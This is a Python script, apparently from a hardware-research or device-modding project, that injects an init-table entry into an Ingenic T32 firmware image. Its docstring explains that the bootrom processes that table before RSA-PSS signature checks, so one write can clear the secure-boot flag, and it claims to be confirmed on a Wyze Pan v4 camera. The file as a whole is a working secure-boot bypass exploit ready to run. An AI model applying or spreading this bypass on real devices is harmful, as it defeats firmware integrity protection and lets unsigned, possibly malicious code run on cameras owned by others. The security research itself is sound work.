#!/usr/bin/env python3
"""Inject a T32 pre-verification init-table patch into a full firmware image.

Confirmed working against the Ingenic T32 bootrom (Wyze Pan v4, 2025-03-26).

T32 Bootrom Secure Boot Flow (SFC path)
========================================

  1. Bootrom reads eFuse registers on every boot:
       *0x80000024 = eFuse 0xB3540210   (secureboot / RSA config)
       *0x80000020 = eFuse 0xB3540214   (AES / halt-on-failure config)
       *0x8000002c = 0x800              (SPL entry-point offset, hardcoded)
       *0x80000014 = 0x80001000         (SPL load base address, hardcoded)

  2. SFC handler reads 0x200-byte SPL header from flash offset 0 → 0x80001000.

  3. Init-table parser runs on header+0x100 = 0x80001100
     **BEFORE** any signature verification:
       - Checks for "INGE" magic (0x45474E49) at +0x00
       - Init entries start at +0x20, each 0x14 (20) bytes:
           [+0x00] addr       — target SRAM/register address (0xFFFFFFFF = skip)
           [+0x04] mask_addr  — poll address (0xFFFFFFFF / ~0 = no poll)
           [+0x08] value      — 32-bit value written to *addr
           [+0x0C] poll_val   — wait-for-set mask on *mask_addr (0 = skip)
           [+0x10] poll_clr   — wait-for-clear mask on *mask_addr (0 = skip)
       - Terminator: addr=0xFFFFFFFF AND mask_addr=0xFFFFFFFF

  4. Secureboot check: if (*0x80000024 & 0x10000) != 0 → RSA-PSS verification

Bypass mechanism
================
Writing 0x00000000 to *0x80000024 via init-table clears bit 16 (secureboot
enable).  The bootrom processes init-table entries before checking the
secureboot flag, so the write takes effect before verification runs.

Verified on Wyze Pan v4 (T32 SoC, SPI NOR boot, 16 MB flash):
Modified SPL + init-table bypass → boots successfully.
"""

from __future__ import annotations

import argparse
import hashlib
import struct
from pathlib import Path

# Init-table constants (relative to boot block start)
MAGIC = 0x45474E49  # "INGE" little-endian
INIT_OFFSET = 0x100  # offset of init-table header within SPL boot block
ENTRY0_OFFSET = 0x120  # first init entry = INIT_OFFSET + 0x20
ENTRY_SIZE = 0x14  # 20 bytes per entry
TERM_OFFSET = ENTRY0_OFFSET + ENTRY_SIZE  # terminator follows first entry
PATCH_LEN = 0x48  # total bytes touched: 0x100..0x147

# T32 SRAM addresses
SECUREBOOT_ADDR = 0x80000024  # bit 16 = secureboot enable
SPL_ENTRY_OFF = 0x800


def parse_int(value: str) -> int:
    return int(value, 0)


def default_output_path(input_path: Path) -> Path:
    return input_path.with_name(f"{input_path.stem}-t32-init-bypass{input_path.suffix}")


def inject_patch(
    data: bytearray,
    boot_offset: int,
    target_addr: int,
    write_value: int,
    force: bool,
) -> None:
    """Inject an INGE init-table into the SPL header's blank region."""
    start = boot_offset + INIT_OFFSET
    end = start + PATCH_LEN
    if end > len(data):
        raise ValueError("image too small for init-table injection at requested boot offset")

    region = data[start:end]
    if not force and any(region):
        raise ValueError(
            f"init-table region {start:#x}..{end - 1:#x} is not blank; rerun with --force to overwrite"
        )

    # init-table header (12 bytes at +0x100)
    struct.pack_into("<III", data, boot_offset + INIT_OFFSET, MAGIC, 0, 0)

    # entry 0 (20 bytes at +0x120)
    struct.pack_into(
        "<IIIII",
        data,
        boot_offset + ENTRY0_OFFSET,
        target_addr,
        0xFFFFFFFF,
        write_value,
        0,
        0,
    )

    # terminator (20 bytes at +0x134)
    struct.pack_into(
        "<IIIII",
        data,
        boot_offset + TERM_OFFSET,
        0xFFFFFFFF,
        0xFFFFFFFF,
        0,
        0,
        0,
    )


def main() -> int:
    parser = argparse.ArgumentParser(
        description=(
            "Inject a T32 pre-verification init-table patch into a full firmware image.  "
            "The init-table is processed by the bootrom BEFORE RSA-PSS "
            "signature verification, allowing a single SRAM write that clears the "
            "secureboot enable flag."
        ),
    )
    parser.add_argument("input", type=Path, help="Path to input firmware image (must be clean/unmodified SPL)")
    parser.add_argument(
        "-o", "--output", type=Path, help="Path to patched output image (default: add -t32-init-bypass)",
    )
    parser.add_argument(
        "--boot-offset",
        type=parse_int,
        default=0,
        help="Offset of the boot block within the full image (default: 0)",
    )
    parser.add_argument(
        "--target-addr",
        type=parse_int,
        default=SECUREBOOT_ADDR,
        help=f"32-bit SRAM address to write (default: {SECUREBOOT_ADDR:#x})",
    )
    parser.add_argument(
        "--write-value",
        type=parse_int,
        default=0,
        help="32-bit value to write to --target-addr (default: 0x0)",
    )
    parser.add_argument(
        "--force",
        action="store_true",
        help="Overwrite a nonblank init-table slot instead of refusing to patch",
    )
    args = parser.parse_args()

    if not args.input.is_file():
        parser.error(f"input image not found: {args.input}")

    output = args.output or default_output_path(args.input)
    data = bytearray(args.input.read_bytes())

    # Sanity check: warn if SPL code region looks corrupted
    spl_code_off = args.boot_offset + SPL_ENTRY_OFF
    if spl_code_off + 4 <= len(data):
        first_word = struct.unpack_from("<I", data, spl_code_off)[0]
        opcode = (first_word >> 26) & 0x3F
        if opcode not in (
            0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0xA, 0xB,
            0xC, 0xD, 0xE, 0xF, 0x10, 0x11, 0x12, 0x13,
            0x20, 0x21, 0x23, 0x24, 0x25, 0x28, 0x29, 0x2B, 0x2F,
        ):
            print(
                f"WARNING: first instruction at SPL entry ({spl_code_off:#x}) = {first_word:#010x} "
                f"does not look like standard MIPS."
            )

    inject_patch(data, args.boot_offset, args.target_addr, args.write_value, args.force)
    output.write_bytes(data)

    sha256 = hashlib.sha256(data).hexdigest()
    patch_start = args.boot_offset + INIT_OFFSET
    patch_end = patch_start + PATCH_LEN
    print(f"input:       {args.input}")
    print(f"output:      {output}")
    print(f"size:        {len(data)} bytes ({len(data):#x})")
    print(f"boot_offset: {args.boot_offset:#x}")
    print(f"target_addr: {args.target_addr:#x}")
    print(f"write_value: {args.write_value:#x}")
    print(f"patch_range: {patch_start:#x}..{patch_end - 1:#x}")
    print(f"sha256:      {sha256}")
    print(f"patch_bytes: {data[patch_start:patch_end].hex()}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
